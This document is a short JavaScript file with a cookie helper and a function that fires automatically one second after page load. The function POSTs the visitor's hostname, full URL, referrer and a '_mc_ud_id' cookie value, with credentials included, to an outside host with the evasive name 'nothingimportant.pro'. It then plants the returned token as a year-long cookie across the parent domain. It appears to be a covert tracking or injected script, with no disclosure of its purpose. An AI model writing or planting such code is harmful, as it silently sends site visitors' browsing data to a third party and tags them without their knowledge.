function cookie(e, o, t) {
  if (void 0 === o) {
    var i = null;
    if (document.cookie && "" != document.cookie)
      for (var n = document.cookie.split(";"), r = 0; r < n.length; r++) {
        var c = jQuery.trim(n[r]);
        if (c.substring(0, e.length + 1) == e + "=") {
          i = decodeURIComponent(c.substring(e.length + 1));
          break;
        }
      }
    return i;
  }
  (t = t || {}), null === o && ((o = ""), (t.expires = -1));
  var s,
    d = "";
  t.expires &&
    ("number" == typeof t.expires || t.expires.toUTCString) &&
    ("number" == typeof t.expires
      ? (s = new Date()).setTime(s.getTime() + 24 * t.expires * 60 * 60 * 1e3)
      : (s = t.expires),
    (d = "; expires=" + s.toUTCString()));
  var a = t.path ? "; path=" + t.path : "",
    u = t.domain ? "; domain=" + t.domain : "",
    m = t.secure ? "; secure" : "";
  document.cookie = [e, "=", encodeURIComponent(o), d, a, u, m].join("");
}
function checkCookie() {
  var e = navigator.cookieEnabled ? 1 : 0;
  return (
    void 0 !== navigator.cookieEnabled ||
      e ||
      ((document.cookie = "testcookie"),
      (e = -1 !== document.cookie.indexOf("testcookie") ? 1 : 0)),
    e
  );
}
async function sendUserIdentification() {
  try {
    const e = await fetch("https://nothingimportant.pro/request.json", {
        method: "POST",
        mode: "cors",
        cache: "no-cache",
        credentials: "include",
        redirect: "follow",
        referrer: "no-referrer",
        body: JSON.stringify({
          currentHost: window.location.hostname,
          currentReferrer: document.referrer,
          currentUrl: window.location.href,
          userTokenId: cookie("_mc_ud_id"),
          checkCookie: checkCookie(),
        }),
        headers: {
          "Content-Type": "multipart/form-data",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "cross-site",
        },
      }),
      o = await e.json();
    if ("success" === o.status && o.token_id) {
      cookie("_mc_ud_id", null);
      let e = window.location.hostname;
      if (e.split(".").length > 1) {
        let o = e.split("."),
          t = o.pop();
        e = o.pop() + "." + t;
      }
      cookie("_mc_ud_id", o.token_id, {
        domain: "." + e,
        expires: 365,
        path: "/",
      });
    }
  } catch (e) {
    console.error("Error:", e);
  }
}
setTimeout(sendUserIdentification.bind(this), 1e3);
